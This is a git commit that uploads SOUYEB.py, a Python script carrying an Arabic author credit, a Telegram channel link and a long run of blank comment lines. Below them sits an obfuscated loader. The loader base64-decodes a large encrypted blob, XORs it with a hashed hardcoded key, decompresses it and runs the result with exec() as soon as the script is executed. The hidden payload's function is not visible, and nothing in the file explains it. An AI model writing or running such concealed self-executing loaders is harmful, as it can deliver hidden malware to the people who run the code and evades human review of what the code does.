2b62a6da53cdc0b457669d9aadbe953a7e6ee49e
NEXXT-xd <teresiitaap@gmail.com>
2025-12-02 14:56:38 +0100

    Add files via upload

---
+++ SOUYEB.py
@@ -0,0 +1,111 @@
+# ملف مشفر من طرف عمك ثامر @u_nJl
+# My channel:  https://t.me/+s4uq0aXzbhdiYWE0
+#
+#SOUYEB THAMAER | Oner 1 Dz
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+import base64, zlib, hashlib, uuid
+def decrypt():
+    enc = '''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'''
+    key = 'sivv8fnaHKS0NNVXNZJR4S7kILo3DUIa'
+
+    def run(enc_data, key):
+        try:
+            hashed_key = hashlib.sha256(key.encode()).digest()
+            raw = base64.b64decode(enc_data)
+            salt, encrypted = raw[:8], raw[8:]
+            decoded = bytearray()
+            for i in range(len(encrypted)):
+                decoded.append(encrypted[i] ^ hashed_key[i % len(hashed_key)])
+            decompressed = zlib.decompress(base64.b64decode(decoded))
+            exec(decompressed.decode(), globals())
+        except Exception as e:
+            print('تمت برمجة ادات من قبل ثامر:', e)
+    run(enc, key)
+decrypt()
